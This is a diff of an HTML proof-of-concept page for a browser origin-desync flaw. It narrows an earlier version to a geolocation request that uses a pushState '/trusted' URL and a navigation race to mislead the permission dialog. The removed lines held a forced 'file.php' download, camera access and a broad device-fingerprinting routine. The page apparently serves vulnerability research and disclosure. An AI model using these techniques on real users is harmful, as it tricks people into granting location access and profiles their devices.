@@ -2,142 +2,94 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Origin Desync Login PoC</title>
+<title>Geolocation Origin Desync PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
 body {
-  margin:0;
-  font-family:-apple-system,BlinkMacSystemFont,system-ui;
-  background:#f5f5f7;
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
 }
 
 button {
-  margin:6px;
-  font-size:14px;
-  padding:8px 12px;
+  font-size: 15px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  border: none;
+  background: #007aff;
+  color: #fff;
 }
 
 #panel {
-  display:none;
-  max-width:520px;
-  margin:60px auto;
-  background:#fff;
-  padding:24px;
-  border-radius:16px;
-  box-shadow:0 20px 60px rgba(0,0,0,.2);
+  display: none;
+  max-width: 420px;
+  margin: 80px auto;
+  background: #fff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.2);
+  text-align: center;
 }
-
-h2 { text-align:center; margin-bottom:6px; }
-.sub { text-align:center; color:#666; margin-bottom:20px; }
 
 .notice {
-  margin-top:14px;
-  font-size:13px;
-  color:#b00020;
-}
-
-.download-button {
-  margin-top:20px;
-  width:100%;
-  padding:12px;
-  font-size:16px;
-  border-radius:10px;
-  border:none;
-  background:#007aff;
-  color:#fff;
-}
-
-video { width:100%; margin-top:10px; }
-
-pre {
-  margin-top:12px;
-  background:#111;
-  color:#0f0;
-  padding:10px;
-  font-size:11px;
-  max-height:260px;
-  overflow:auto;
+  margin-top: 14px;
+  font-size: 13px;
+  color: #b00020;
 }
 </style>
 </head>
 
 <body>
 
-<div style="text-align:center">
+<div style="text-align:center; margin-top:60px;">
   <button id="trigger">Start PoC</button>
 </div>
 
 <div id="panel">
-  <h2>Download File</h2>
-  <div class="sub">Click below to download file.php</div>
-
-  <button class="download-button" onclick="downloadFile()">
-    Download File (file.php)
-  </button>
-
-  <hr>
+  <h2>Request Location</h2>
+  <p>Tap the button below to request Geolocation permission.</p>
 
   <button onclick="getLocation()">Get Location</button>
-  <p id="locationOutput">Location: -</p>
-
-  <button onclick="openCamera()">Open Camera</button>
-  <video id="camera" autoplay playsinline></video>
-
-  <hr>
-
-  <!-- 🔥 API FINGERPRINTING -->
-  <button onclick="callAllAPIs()">CALL ALL APIs</button>
-  <button onclick="clearLog()">CLEAR LOG</button>
-  <pre id="apiLog"></pre>
+  <p id="output">Location: -</p>
 
   <div class="notice">
-    Demo only — browser permission required
+    Demo only — observe origin shown in permission dialog
   </div>
 </div>
 
 <script>
-const panel = document.getElementById('panel');
+const panel   = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
-const apiLog = document.getElementById('apiLog');
-
-/* ======================
-   FUNGSI ASLI (TIDAK DIUBAH)
-====================== */
-function downloadFile() {
-  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`;
-  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
-  const fileUrl = URL.createObjectURL(fileBlob);
-
-  const downloadLink = document.createElement('a');
-  downloadLink.href = fileUrl;
-  downloadLink.download = 'file.php';
-  document.body.appendChild(downloadLink);
-  downloadLink.click();
-  document.body.removeChild(downloadLink);
-}
+const output  = document.getElementById('output');
 
 function getLocation() {
-  const output = document.getElementById('locationOutput');
   if (!navigator.geolocation) return;
+
   navigator.geolocation.getCurrentPosition(
-    pos => output.textContent =
-      `${pos.coords.latitude}, ${pos.coords.longitude}`,
-    () => output.textContent = 'Permission denied'
+    pos => {
+      output.textContent =
+        `${pos.coords.latitude}, ${pos.coords.longitude}`;
+    },
+    () => {
+      output.textContent = 'Permission denied';
+    }
   );
 }
 
-function openCamera() {
-  navigator.mediaDevices.getUserMedia({ video:true })
-    .then(s => camera.srcObject = s)
-    .catch(()=>alert('Camera denied'));
-}
-
+/*
+ * Step 1:
+ * Manipulate visible URL to a trusted-looking path
+ */
 trigger.onclick = () => {
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
 };
 
+/*
+ * Step 2:
+ * Trigger a navigation race shortly after permission flow starts
+ */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
@@ -147,100 +99,6 @@ window.addEventListener('pageshow', () => {
     });
   });
 });
-
-/* ======================
-   API FINGERPRINTING
-====================== */
-const log = m => apiLog.textContent += m + "\n";
-const clearLog = () => apiLog.textContent = "";
-
-async function callAllAPIs() {
-  log("=== API FINGERPRINT START ===");
-
-  // Storage
-  localStorage.setItem('a','1');
-  sessionStorage.setItem('b','1');
-  indexedDB.open('PWNNNNN');
-  log("Storage: OK");
-
-  // Clipboard
-  try { await navigator.clipboard.writeText("PWNNNNN"); log("Clipboard: OK"); }
-  catch { log("Clipboard: DENIED"); }
-
-  // Notification
-  if (Notification) log("Notification: " + await Notification.requestPermission());
-
-  // Battery
-  if (navigator.getBattery) {
-    const b = await navigator.getBattery();
-    log("Battery: " + Math.round(b.level*100) + "%");
-  }
-
-  // Network
-  if (navigator.connection)
-    log("Network: " + navigator.connection.effectiveType);
-
-  // Vibration
-  navigator.vibrate?.(100);
-
-  // Orientation / Motion
-  addEventListener('deviceorientation', e => log("Orientation: "+e.alpha), {once:true});
-  addEventListener('devicemotion', ()=>log("Motion: OK"), {once:true});
-
-  // Speech
-  speechSynthesis.speak(new SpeechSynthesisUtterance("API fingerprint"));
-  log("Speech synthesis: OK");
-
-  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
-  log("Speech recognition: " + (SR ? "SUPPORTED":"NO"));
-
-  // Fullscreen
-  document.documentElement.requestFullscreen().catch(()=>{});
-  log("Fullscreen: requested");
-
-  // Visibility
-  log("Visibility: " + document.visibilityState);
-
-  // Performance
-  log("Performance.now: " + performance.now());
-
-  // Canvas / WebGL
-  const c = document.createElement('canvas');
-  c.getContext('2d').fillRect(0,0,10,10);
-  log("Canvas: OK");
-  log("WebGL: " + (c.getContext('webgl') ? "OK":"NO"));
-
-  // Gamepad
-  log("Gamepads: " + navigator.getGamepads().length);
-
-  // WebRTC audio
-  try {
-    await navigator.mediaDevices.getUserMedia({audio:true});
-    log("WebRTC audio: OK");
-  } catch { log("WebRTC audio: DENIED"); }
-
-  // Screen
-  log(`Screen: ${screen.width}x${screen.height}`);
-
-  // Lang / TZ
-  log("Lang: " + navigator.language);
-  log("TZ: " + Intl.DateTimeFormat().resolvedOptions().timeZone);
-
-  // Online
-  log("Online: " + navigator.onLine);
-
-  // Permissions
-  if (navigator.permissions) {
-    for (const p of ['camera','microphone','geolocation','notifications']) {
-      try {
-        const r = await navigator.permissions.query({name:p});
-        log(`Perm ${p}: ${r.state}`);
-      } catch {}
-    }
-  }
-
-  log("=== API FINGERPRINT END ===");
-}
 </script>
 
 </body>
